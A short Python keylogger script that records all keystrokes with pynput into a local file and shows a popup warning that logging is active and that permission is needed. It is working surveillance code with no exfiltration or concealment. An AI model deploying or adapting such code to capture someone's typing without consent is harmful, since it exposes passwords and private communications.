from pynput import keyboard
import tkinter as tk
from threading import Thread

# File to store keystrokes
LOG_FILE = "keylog.txt"

# Function to show a popup notification
def show_notification():
    root = tk.Tk()
    root.title("Keylogger Notification")
    root.geometry("400x200")
    root.resizable(False, False)
    
    label = tk.Label(root, text="⚠️ Keystrokes are being logged!", font=("Arial", 12), fg="red")
    label.pack(pady=20)

    info = tk.Label(root, text="This program records keystrokes for monitoring purposes.\n"
                               "Make sure you have permission to use it.", font=("Arial", 10), fg="black")
    info.pack(pady=10)

    btn = tk.Button(root, text="OK", command=root.destroy, font=("Arial", 12))
    btn.pack(pady=10)

    root.mainloop()

# Run notification in a separate thread to avoid blocking the script
Thread(target=show_notification).start()

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        f.write(key)

# Callback function for key presses
def on_press(key):
    try:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        elif key == keyboard.Key.backspace:
            write_to_file("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            write_to_file("[TAB]")
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            write_to_file("[SHIFT]")
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            write_to_file("[CTRL]")
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            write_to_file("[ALT]")
        else:
            write_to_file(str(key).replace("'", ""))  # Remove quotes from characters
    except Exception as e:
        print(f"Error: {e}")

# Listener setup
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
